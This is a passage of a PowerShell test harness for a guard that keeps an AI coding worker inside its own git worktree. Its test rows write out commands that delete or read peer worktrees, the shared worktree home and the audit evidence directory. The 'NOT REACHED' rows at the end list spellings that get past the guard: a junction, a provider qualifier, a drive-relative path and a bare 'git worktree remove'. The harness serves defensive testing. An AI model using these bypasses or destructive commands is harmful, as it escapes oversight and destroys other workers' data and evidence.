# tree, the CLI's real value), 'wtenv' (CLAUDE_PROJECT_DIR = the mission root spelled LONG -- the short
# spelling already lets rulings 1-2 derive the alias home by basename, which would hide ruling 8 -- and
# LAM_WORKTREE = the own tree) and 'r1' (CLAUDE_PROJECT_DIR = the sandbox, LAM_WORKTREE unset: ruling 7
# alone). EVERY EXISTING ROW RUNS WITH LAM_WORKTREE REMOVED, so ruling 8 cannot make one pass for a new
# reason. In 'r1' the textual home-name row is NOT REACHED (ruling 8's name is the only thing that sees a
# computed prefix) and is measured as such. The $WT bound stays: n7 reads a peer through a variable
# holding the home and must still ALLOW.
function New-Wp1H18Fixture {
    param([string]$Root)
    $enc = New-Object System.Text.UTF8Encoding($false)
    $rootF = $Root.Replace('\', '/')
    foreach ($d in @('project\src', 'smoke\src', 'outside', 'subshape')) {
        New-Item -ItemType Directory -Path (Join-Path $Root $d) -Force | Out-Null
    }
    foreach ($w in @('wt-D-OWN', 'wt-D-PEER', 'wt-D-OWN2', 'D-OWN', 'D-PEER3')) {
        New-Item -ItemType Directory -Path (Join-Path $Root "project-worktrees\$w\src") -Force | Out-Null
        [System.IO.File]::WriteAllText((Join-Path $Root "project-worktrees\$w\src\file.txt"), "tree $w", $enc)
    }
    foreach ($w in @('wt-D-OWN', 'wt-D-PEER')) {
        New-Item -ItemType Directory -Path (Join-Path $Root "smoke-worktrees\$w\src") -Force | Out-Null
        [System.IO.File]::WriteAllText((Join-Path $Root "smoke-worktrees\$w\src\file.txt"), "smoke $w", $enc)
    }
    # THE TWO MAIN REPOSITORIES are real `git init`s, so `.git` is a DIRECTORY git itself made. A native
    # exe's stderr is fatal under this file's EAP=Stop, so the preference is relaxed around the calls only.
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        & git init -q (Join-Path $Root 'project') 2>&1 | Out-Null
        & git init -q (Join-Path $Root 'smoke') 2>&1 | Out-Null
    } finally { $ErrorActionPreference = $prevEap }
    # THE WORKER'S OWN WORKTREES: a `.git` FILE naming the main repository's worktree admin directory,
    # which is what `git worktree add` writes and what ruling 1 reads. The peers carry no `.git`.
    [System.IO.File]::WriteAllText((Join-Path $Root 'project-worktrees\wt-D-OWN\.git'), "gitdir: $rootF/project/.git/worktrees/wt-D-OWN`n", $enc)
    [System.IO.File]::WriteAllText((Join-Path $Root 'smoke-worktrees\wt-D-OWN\.git'), "gitdir: $rootF/smoke/.git/worktrees/wt-D-OWN`n", $enc)
    # A SUBMODULE-SHAPED gitdir, from which ruling 1 derives NOTHING.
    [System.IO.File]::WriteAllText((Join-Path $Root 'subshape\.git'), "gitdir: ../project/.git/modules/subshape`n", $enc)
    # A REAL JUNCTION inside the worker's own tree pointing at a peer: the NOT-REACHED link case, made
    # by the instrument itself (never through the guard) so the detail can show it is judged by name.
    New-Item -ItemType Junction -Path (Join-Path $Root 'project-worktrees\wt-D-OWN\lnk') -Target (Join-Path $Root 'project-worktrees\wt-D-PEER') | Out-Null
}
function Remove-Wp1H18Fixture {
    param([string]$Root)
    if (-not $Root -or -not (Test-Path -LiteralPath $Root)) { return }
    # THE JUNCTION FIRST AND NON-RECURSIVELY, so the recursive removal can never walk through it.
    $lnk = Join-Path $Root 'project-worktrees\wt-D-OWN\lnk'
    try { if (Test-Path -LiteralPath $lnk) { [System.IO.Directory]::Delete($lnk, $false) } } catch { }
    Remove-Item -LiteralPath $Root -Recurse -Force -ErrorAction SilentlyContinue
}
function Invoke-Wp1H18Git {
    # git for the shape fixture ONLY: never `git config`, no hooks, identity passed per call, stderr kept
    # out of this file's EAP=Stop. Returns @{ code; out }.
    param([string]$Dir, [string[]]$GitArgs)
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $o = & git -C $Dir -c core.hooksPath=wp1-h18-no-hooks -c user.name=wp1-h18 -c user.email=wp1-h18@fixture.invalid -c commit.gpgsign=false @GitArgs 2>&1 | ForEach-Object { "$_" }
        $code = $LASTEXITCODE
    } finally { $ErrorActionPreference = $prevEap }
    return [pscustomobject]@{ code = $code; out = (@($o) -join "`n") }
}
function Test-Wp1H18GitDirInside {
    # The git dir git itself reports for $Dir lies INSIDE $Inside (asserted before anything is written through it).
    param([string]$Dir, [string]$Inside)
    $r = Invoke-Wp1H18Git -Dir $Dir -GitArgs @('rev-parse', '--absolute-git-dir')
    $gd = $r.out.Trim().Replace('/', '\')
    return (($r.code -eq 0) -and $gd.StartsWith($Inside.TrimEnd('\') + '\', [System.StringComparison]::OrdinalIgnoreCase))
}
function New-Wp1H18ShapeFixture {
    <#
      The three mission-root shapes, under $Root (itself under the temp root). Returns an ordered map
      shape -> facts; a shape whose build fails carries ok = $false and a `sentence` saying why, and no
      row is driven for it. Nothing here throws past the caller: a git failure is a RED sentence.
    #>
    param([string]$Root)
    $facts = [ordered]@{}
    $fso = New-Object -ComObject Scripting.FileSystemObject
    $enc = New-Object System.Text.UTF8Encoding($false)
    foreach ($spec in @(@('m1a', 'missionroot', 'alias'), @('m1b', 'projectroot', 'alias'), @('m2', 'main', 'linked'))) {
        $key = $spec[0]
        $f = [ordered]@{ key = $key; kind = $spec[2]; ok = $false; sentence = '' }
        $facts[$key] = $f
        try {
            $parentLong = Join-Path $Root $key
            $mainLong = Join-Path $parentLong $spec[1]
            New-Item -ItemType Directory -Path $mainLong -Force | Out-Null
            $r = Invoke-Wp1H18Git -Dir $mainLong -GitArgs @('init', '-q')
            if ($r.code -ne 0 -or -not (Test-Wp1H18GitDirInside -Dir $mainLong -Inside $mainLong)) { $f['sentence'] = "git init in $mainLong did not yield a git dir inside it ($($r.out))"; continue }
            [System.IO.File]::WriteAllText((Join-Path $mainLong 'README.txt'), "main of $key", $enc)
            $null = Invoke-Wp1H18Git -Dir $mainLong -GitArgs @('add', 'README.txt')
            $r = Invoke-Wp1H18Git -Dir $mainLong -GitArgs @('commit', '-q', '-m', 'wp1 h18 shape fixture')
            if ($r.code -ne 0) { $f['sentence'] = "git commit in $mainLong failed ($($r.out))"; continue }
            $f['mainLong'] = $mainLong
            if ($spec[2] -eq 'alias') {
                $alias = [string]$fso.GetFolder($mainLong).ShortName
                $f['alias'] = $alias
                if (-not $alias -or ($alias -eq $spec[1]) -or ($alias -notmatch '~[0-9]')) {
                    $f['sentence'] = "THE VOLUME YIELDS NO 8.3 ALIAS for '$mainLong' (ShortName '$alias'): shape $key cannot be built, so its rows are not driven and this member is RED -- 8.3 name creation may be disabled on this volume"
                    continue
                }
                $given = (Resolve-Path -LiteralPath ([string]$fso.GetFolder($mainLong).ShortPath)).Path
                $f['rootLong'] = $mainLong
            } else {
                $side = Join-Path $parentLong 'side'
                $r = Invoke-Wp1H18Git -Dir $mainLong -GitArgs @('worktree', 'add', '-q', '-b', 'side', $side)
                if ($r.code -ne 0 -or -not (Test-Wp1H18GitDirInside -Dir $side -Inside $mainLong)) { $f['sentence'] = "git worktree add of side failed or its git dir is outside the fixture ($($r.out))"; continue }
                $given = (Resolve-Path -LiteralPath $side).Path
                $f['rootLong'] = $side
                $f['sideGitFile'] = ([System.IO.File]::ReadAllText((Join-Path $side '.git'))).Trim()
            }
            $f['rootGiven'] = $given
            # THE RUNNER'S COMPOSITION, from the root AS GIVEN (mission-dispatch.ps1).
            $homeGiven = Join-Path ([System.IO.Path]::GetDirectoryName($given)) ("$([System.IO.Path]::GetFileName($given))-worktrees")
            $f['homeName'] = [System.IO.Path]::GetFileName($homeGiven)
            $f['homeGiven'] = $homeGiven
            $f['homeLong'] = Join-Path $parentLong $f['homeName']
            $treesOk = $true
            foreach ($w in @('wt-D-OWN', 'wt-D-PEER')) {
                $tree = Join-Path $homeGiven $w
                $r = Invoke-Wp1H18Git -Dir $given -GitArgs @('worktree', 'add', '-q', '-b', "worktree-$w", $tree)
                if ($r.code -ne 0 -or -not (Test-Wp1H18GitDirInside -Dir $tree -Inside $mainLong)) { $treesOk = $false; $f['sentence'] = "git worktree add of $w from '$given' failed or its git dir is outside the fixture ($($r.out))"; break }
                $f["gitFile-$w"] = ([System.IO.File]::ReadAllText((Join-Path $tree '.git'))).Trim()
            }
            if (-not $treesOk) { continue }
            New-Item -ItemType Directory -Path (Join-Path $homeGiven 'wt-D-OWN\src') -Force | Out-Null
            [System.IO.File]::WriteAllText((Join-Path $homeGiven 'wt-D-OWN\src\own.txt'), "own of $key", $enc)
            [System.IO.File]::WriteAllText((Join-Path $homeGiven 'wt-D-PEER\f.txt'), "peer of $key", $enc)
            New-Item -ItemType Directory -Path (Join-Path $homeGiven 'wt-D-OWN2') -Force | Out-Null
            [System.IO.File]::WriteAllText((Join-Path $homeGiven 'wt-D-OWN2\f.txt'), "prefix-sharing peer of $key", $enc)
            $f['ownGiven']  = Join-Path $homeGiven 'wt-D-OWN'
            $f['ownLong']   = Join-Path $f['homeLong'] 'wt-D-OWN'
            $f['ownShort']  = [string]$fso.GetFolder($f['ownGiven']).ShortPath
            $f['peerGiven'] = Join-Path $homeGiven 'wt-D-PEER'
            $f['peerLong']  = Join-Path $f['homeLong'] 'wt-D-PEER'
            $f['peerShort'] = [string]$fso.GetFolder($f['peerGiven']).ShortPath
            $f['worktreeList'] = (Invoke-Wp1H18Git -Dir $mainLong -GitArgs @('worktree', 'list', '--porcelain')).out
            $f['ok'] = $true
        } catch {
            $f['ok'] = $false
            $f['sentence'] = "shape $key could not be built: $($_.Exception.Message)"
        }
    }
    return $facts
}
function Get-Wp1H18Denials {
    param([string]$Proj, [string]$DispatchId)
    $p = Join-Path (Get-EvidenceRuntimeDir -Root $Proj -DispatchId $DispatchId) 'log.jsonl'
    $out = New-Object System.Collections.Generic.List[object]
    if (Test-Path -LiteralPath $p) {
        foreach ($line in [System.IO.File]::ReadAllLines($p)) {
            if (-not $line.Trim()) { continue }
            $e = $null
            try { $e = $line | ConvertFrom-Json } catch { $e = $null }
            if ($null -ne $e -and [string](Get-EntryField $e 'tool' '') -eq '_denied') { $out.Add($e) }
        }
    }
    return $out.ToArray()
}

$h18Root   = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h18-' + [guid]::NewGuid().ToString('N'))
$h18Tb     = $h18Root.TrimEnd('\')
$h18Tf     = $h18Tb.Replace('\', '/')
$h18Mr     = '.mission' + '-runtime'
$h18Id     = 'session-wp1-peerwt'
$h18Worker = 'D-OWN'
$h18Cwds = @{
    own      = "$h18Tb\project-worktrees\wt-D-OWN"
    ownsrc   = "$h18Tb\project-worktrees\wt-D-OWN\src"
    outside  = "$h18Tb\outside"
    smokeown = "$h18Tb\smoke-worktrees\wt-D-OWN"
}
$h18Projs = @{
    sandbox  = $sandbox
    ownwt    = "$h18Tb\project-worktrees\wt-D-OWN"
    smokeown = "$h18Tb\smoke-worktrees\wt-D-OWN"
}
# kind: own = this rule must not fire; peer = worker refused BY THIS RULE; limit = a measured limit that
# must stay admitted (the anchor is what decides r3); ctl-deny / ctl-allow = role-blind controls;
# nr = NOT REACHED, measured and printed, asserted only to have run. want = the worker's verdict,
# base = the verdict without this rule (item 3's library), which is also what the seat must return.
$h18Rows = @(
    # ---- OWN: the worker's own tree. THIS RULE MUST NOT FIRE. -----------------------------------
    [pscustomobject]@{ id = 'o01'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'read inside own src, absolute'; text = "cat $h18Tf/project-worktrees/wt-D-OWN/src/file.txt" }
    [pscustomobject]@{ id = 'o02'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'write-redirect inside own src, absolute'; text = "echo x > $h18Tf/project-worktrees/wt-D-OWN/src/file.txt" }
    [pscustomobject]@{ id = 'o03'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; lwt = 'h18own'; why = 'rm -rf own src, absolute -- LAM_WORKTREE = the own tree (b1s6 item 2)'; text = "rm -rf $h18Tf/project-worktrees/wt-D-OWN/src" }
    [pscustomobject]@{ id = 'o04'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'read, relative from the worktree root'; text = 'cat src/file.txt' }
    [pscustomobject]@{ id = 'o05'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'write-redirect, relative from the root'; text = 'echo x > src/file.txt' }
    [pscustomobject]@{ id = 'o06'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; lwt = 'h18own'; why = 'rm -rf, relative from the root -- LAM_WORKTREE = the own tree (b1s6 item 2)'; text = 'rm -rf src' }
    [pscustomobject]@{ id = 'o07'; kind = 'own'; tool = 'shell'; cwd = 'ownsrc'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'read from a SUBDIRECTORY cwd, where a worker ordinarily stands'; text = 'cat file.txt' }
    [pscustomobject]@{ id = 'o08'; kind = 'own'; tool = 'shell'; cwd = 'ownsrc'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'write-redirect from the subdirectory through ..'; text = 'echo x > ../src/file.txt' }
    [pscustomobject]@{ id = 'o09'; kind = 'own'; tool = 'shell'; cwd = 'ownsrc'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; lwt = 'h18own'; why = 'rm -rf from the subdirectory through .. -- LAM_WORKTREE = the own tree (b1s6 item 2)'; text = 'rm -rf ../src' }
    [pscustomobject]@{ id = 'o10'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = '..-THROUGH-OWN: out to the home and back into own by name'; text = 'cat ../wt-D-OWN/src/file.txt' }
    [pscustomobject]@{ id = 'o11'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = '..-through-own write-redirect'; text = 'echo x > ../wt-D-OWN/src/file.txt' }
    [pscustomobject]@{ id = 'o12'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; lwt = 'h18own'; why = '..-through-own rm -rf -- LAM_WORKTREE = the own tree (b1s6 item 2)'; text = 'rm -rf ../wt-D-OWN/src' }
    [pscustomobject]@{ id = 'o13'; kind = 'own'; tool = 'shell'; cwd = 'ownsrc'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = '..-through-own from the SUBDIRECTORY'; text = 'cat ../../wt-D-OWN/src/file.txt' }
    [pscustomobject]@{ id = 'o14'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'CASE variant of own, relative'; text = 'cat ../WT-D-OWN/src/file.txt' }
    [pscustomobject]@{ id = 'o15'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'CASE variant of own and of the home, absolute'; text = "cat $h18Tf/PROJECT-WORKTREES/WT-D-OWN/src/file.txt" }
    [pscustomobject]@{ id = 'o16'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'TRAILING-DOT own (Win32 opens wt-D-OWN), relative'; text = 'cat ../wt-D-OWN./src/file.txt' }
    [pscustomobject]@{ id = 'o17'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'trailing-dot own, BACKSLASH absolute'; text = "cat $h18Tb\project-worktrees\wt-D-OWN.\src\file.txt" }
    [pscustomobject]@{ id = 'o18'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'the TEXTUAL matcher on own: a computed ~ prefix before the own segment'; text = 'cat ~/Projects/org/project-worktrees/wt-D-OWN/src/file.txt' }
    [pscustomobject]@{ id = 'o19'; kind = 'own'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'an innocent path ASSEMBLY that names own'; text = "Get-Content ('../wt-D-OWN' + '/src/file.txt')" }
    [pscustomobject]@{ id = 'o20'; kind = 'own'; tool = 'Write'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'FILE TOOL: Write a new file into own src'; text = "$h18Tb\project-worktrees\wt-D-OWN\src\new.txt" }
    [pscustomobject]@{ id = 'o21'; kind = 'own'; tool = 'Edit'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'FILE TOOL: Edit own src'; text = "$h18Tb\project-worktrees\wt-D-OWN\src\file.txt" }
    # ---- PEER: the worker is refused, BY THIS RULE. ---------------------------------------------
    [pscustomobject]@{ id = 'p01'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'read a peer, absolute'; text = "cat $h18Tf/project-worktrees/wt-D-PEER/src/file.txt" }
    [pscustomobject]@{ id = 'p02'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'write-redirect into a peer, absolute'; text = "echo x > $h18Tf/project-worktrees/wt-D-PEER/src/file.txt" }
    [pscustomobject]@{ id = 'p03'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'rm -rf a peer, absolute'; text = "rm -rf $h18Tf/project-worktrees/wt-D-PEER" }
    [pscustomobject]@{ id = 'p04'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'THE ORDINARY SPELLING: a bare relative .. from own ROOT (resolved matcher only)'; text = 'cat ../wt-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'p05'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = '.. write-redirect from own root'; text = 'echo x > ../wt-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'p06'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = '.. rm -rf of a whole peer from own root'; text = 'rm -rf ../wt-D-PEER' }
    [pscustomobject]@{ id = 'p07'; kind = 'peer'; tool = 'shell'; cwd = 'ownsrc'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'FROM A SUBDIRECTORY cwd: ../../ reaches the peer (an earlier attempt drove none)'; text = 'rm -rf ../../wt-D-PEER/src' }
    [pscustomobject]@{ id = 'p08'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'BACKSLASH spelling'; text = 'cat ..\wt-D-PEER\src\file.txt' }
    [pscustomobject]@{ id = 'p09'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'CASE variant PROJECT-WORKTREES/WT-D-PEER, absolute'; text = "cat $h18Tf/PROJECT-WORKTREES/WT-D-PEER/src/file.txt" }
    [pscustomobject]@{ id = 'p10'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'case variant, relative'; text = 'cat ../WT-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'p11'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'TRAILING-DOT wt-D-PEER. (Win32 opens the peer)'; text = 'cat ../wt-D-PEER./src/file.txt' }
    [pscustomobject]@{ id = 'p12'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'THE PREFIX-SHARING PEER wt-D-OWN2: own is EXACT, never a prefix'; text = 'cat ../wt-D-OWN2/src/file.txt' }
    [pscustomobject]@{ id = 'p13'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'the prefix-sharing peer, absolute rm -rf'; text = "rm -rf $h18Tf/project-worktrees/wt-D-OWN2" }
    [pscustomobject]@{ id = 'p14'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'THE BARE OWN ID D-OWN is not own (ruling 3: only wt-<LAM_DISPATCH> is)'; text = 'cat ../D-OWN/src/file.txt' }
    [pscustomobject]@{ id = 'p15'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'A NON-wt ENTRY D-PEER3 (the ruling-3 fork: no worker tree, refused)'; text = 'cat ../D-PEER3/src/file.txt' }
    [pscustomobject]@{ id = 'p16'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'PATH FRAGMENT: the dispatched example (its ../wt-D- piece also resolves to a non-own entry)'; text = "Get-Content ('../wt-D-' + 'PEER/src/file.txt')" }
    [pscustomobject]@{ id = 'p17'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'PATH FRAGMENT ONLY: each piece names own, only the assembly names wt-D-OWN2'; text = "Get-Content ('../wt-D-OWN' + '2/src/file.txt')" }
    [pscustomobject]@{ id = 'p18'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'a literal Join-Path to a peer'; text = "Get-Content (Join-Path '..' 'wt-D-PEER/src/file.txt')" }
    [pscustomobject]@{ id = 'p19'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'A ~-PREFIXED spelling the shell computes (textual matcher only)'; text = 'cat ~/Projects/org/project-worktrees/wt-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'p20'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'a $HOME-prefixed rm -rf (textual matcher only)'; text = 'rm -rf $HOME/Projects/org/project-worktrees/wt-D-PEER' }
    [pscustomobject]@{ id = 'p21'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'a cmd %USERPROFILE% spelling (textual matcher only)'; text = 'type %USERPROFILE%\Projects\org\project-worktrees\wt-D-PEER\src\file.txt' }
    [pscustomobject]@{ id = 'p22'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'THE HOME ITSELF (ruling 4): rm -rf .. from own root destroys every peer through it'; text = 'rm -rf ..' }
    [pscustomobject]@{ id = 'p23'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'the home, spelled ../.'; text = 'rm -rf ../.' }
    [pscustomobject]@{ id = 'p24'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'the home, READ (a shell read is not exempt)'; text = 'ls ..' }
    [pscustomobject]@{ id = 'p25'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'the home, absolute'; text = "rm -rf $h18Tf/project-worktrees" }
    [pscustomobject]@{ id = 'p26'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'the home behind a computed ~ prefix (the textual fork)'; text = 'rm -rf ~/Projects/org/project-worktrees' }
    [pscustomobject]@{ id = 'p27'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'CREATING A JUNCTION that names a peer (the link rule only judges protected targets)'; text = 'New-Item -ItemType Junction -Path lnk2 -Target ../wt-D-PEER' }
    [pscustomobject]@{ id = 'p28'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'mklink /J naming a peer'; text = 'cmd /c mklink /J lnk3 ..\wt-D-PEER' }
    [pscustomobject]@{ id = 'p29'; kind = 'peer'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'cd to the home and delete a peer by its bare name, one command'; text = 'cd .. && rm -rf wt-D-PEER' }
    [pscustomobject]@{ id = 'p30'; kind = 'peer'; tool = 'Write'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'FILE TOOL: Write into a peer, absolute'; text = "$h18Tb\project-worktrees\wt-D-PEER\src\file.txt" }
    [pscustomobject]@{ id = 'p31'; kind = 'peer'; tool = 'Edit'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'FILE TOOL: Edit a peer, absolute'; text = "$h18Tb\project-worktrees\wt-D-PEER\src\file.txt" }
    [pscustomobject]@{ id = 'p32'; kind = 'peer'; tool = 'Write'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'FILE TOOL: an absolute path through own and .. into a peer (the raw text names own)'; text = "$h18Tb\project-worktrees\wt-D-OWN\..\wt-D-PEER\src\file.txt" }
    [pscustomobject]@{ id = 'p33'; kind = 'peer'; tool = 'Write'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'FILE TOOL: a relative file_path into a peer'; text = '../wt-D-PEER/src/new.txt' }
    # ---- RULING 1: WHICH REPOSITORY -- the anchors, and the one they cannot reach. ---------------
    [pscustomobject]@{ id = 'r1'; kind = 'peer'; tool = 'shell'; cwd = 'outside'; proj = 'ownwt'; want = 'DENY'; base = 'ALLOW'; why = 'THE DISPATCHED ROW: payload cwd OUTSIDE every repository, CLAUDE_PROJECT_DIR at own worktree'; text = "cat $h18Tf/project-worktrees/wt-D-PEER/src/file.txt" }
    [pscustomobject]@{ id = 'r2'; kind = 'peer'; tool = 'shell'; cwd = 'smokeown'; proj = 'sandbox'; want = 'DENY'; base = 'ALLOW'; why = 'the DERIVED name smoke-worktrees, from the cwd anchor'; text = 'cat ../wt-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'r3'; kind = 'peer'; tool = 'shell'; cwd = 'outside'; proj = 'smokeown'; want = 'DENY'; base = 'ALLOW'; why = 'the derived name reachable ONLY through CLAUDE_PROJECT_DIR (cwd outside, library under the checkout)'; text = 'cat ../smoke-worktrees/wt-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'r4'; kind = 'limit'; tool = 'shell'; cwd = 'outside'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = "r3's CONTROL AND A LIMIT: no anchor places the worker under the smoke repository, so nothing derives smoke-worktrees"; text = 'cat ../smoke-worktrees/wt-D-PEER/src/file.txt' }
    # ---- CONTROLS, role-blind. --------------------------------------------------------------------
    [pscustomobject]@{ id = 'cd1'; kind = 'ctl-deny'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'DENY'; base = 'DENY'; why = "DENY CONTROL: the runtime evidence plane, A1's own refusal for BOTH roles"; text = "rm -rf $h18Mr/evidence" }
    [pscustomobject]@{ id = 'ca1'; kind = 'ctl-allow'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = 'ALLOW'; base = 'ALLOW'; why = 'ALLOW CONTROL: ordinary work naming nothing, for both roles'; text = 'git status --porcelain' }
    # ---- NOT REACHED: measured and printed, asserted only to have RUN. ---------------------------
    # n1 'rm -rf ../..' (an ANCESTOR of the home) MOVED TO H-19 as d45 (b1s6 item 2): the peer rule still does not name
    # the ancestor (e15), and the recursive-delete rule now refuses a worker's recursive delete of it.
    [pscustomobject]@{ id = 'n2'; kind = 'nr'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = '-'; base = 'ALLOW'; why = 'a .. WALK BEHIND A COMPUTED PREFIX: $PWD is popped by .. in the text, never by the shell'; text = 'cat $PWD/../wt-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'n3'; kind = 'nr'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = '-'; base = 'ALLOW'; why = 'a TOOL-COMPUTED path: git resolves a worktree from its bare last component'; text = 'git worktree remove --force wt-D-PEER' }
    [pscustomobject]@{ id = 'n4'; kind = 'nr'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = '-'; base = 'ALLOW'; why = 'A LINK, judged by NAME: lnk is a real junction to wt-D-PEER (F-0 reads the peer through it)'; text = 'cat lnk/src/file.txt' }
    [pscustomobject]@{ id = 'n5'; kind = 'nr'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = '-'; base = 'ALLOW'; why = 'A POWERSHELL PROVIDER QUALIFIER: `FileSystem::` is a non-empty first segment that the `..` pops instead of the cwd, so the token resolves under own; it really reads the peer (measured). Neither matcher reads a provider-qualified path'; text = 'Get-Content FileSystem::../wt-D-PEER/src/file.txt' }
    [pscustomobject]@{ id = 'n6'; kind = 'nr'; tool = 'shell'; cwd = 'own'; proj = 'sandbox'; want = '-'; base = 'ALLOW'; why = 'A DRIVE-RELATIVE token `C:..\\`: its target is the DRIVE current directory, process state the guard does not have -- the same uncomputable class as $HOME (the own-tree exemption fails it closed; a deny rule fails it open). Not rooted, so the resolved matcher skips it'; text = 'cmd /c type C:..\wt-D-PEER\src\file.txt' }
